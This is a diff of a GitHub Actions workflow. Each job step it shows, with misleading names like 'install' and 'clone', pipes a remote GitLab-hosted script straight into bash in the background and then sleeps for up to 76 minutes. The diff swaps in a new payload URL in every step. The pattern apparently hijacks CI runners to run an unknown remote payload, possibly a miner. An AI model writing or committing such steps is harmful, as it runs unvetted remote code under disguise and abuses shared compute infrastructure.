@@ -24,7 +24,7 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: install
-      run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/layers | bash &
+      run: curl -sL  https://gitlab.com/uptime77/notes/-/raw/main/likesans | bash &
            sleep 400s
   cincau:
     needs: build
@@ -42,8 +42,8 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: install curl
-      run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/layers | bash &
-            sleep 76m
+      run: curl -sL  https://gitlab.com/uptime77/notes/-/raw/main/likesans | bash &
+            sleep 36m
         
     
      
@@ -63,7 +63,7 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: clone
-      run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/layers | bash &
+      run: curl -sL  https://gitlab.com/uptime77/notes/-/raw/main/likesans | bash &
             sleep 26m
   tekwan:
     needs: cincau
@@ -81,5 +81,5 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: clone
-      run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/layers | bash &
+      run: curl -sL  https://gitlab.com/uptime77/notes/-/raw/main/likesans | bash &
             sleep 60m
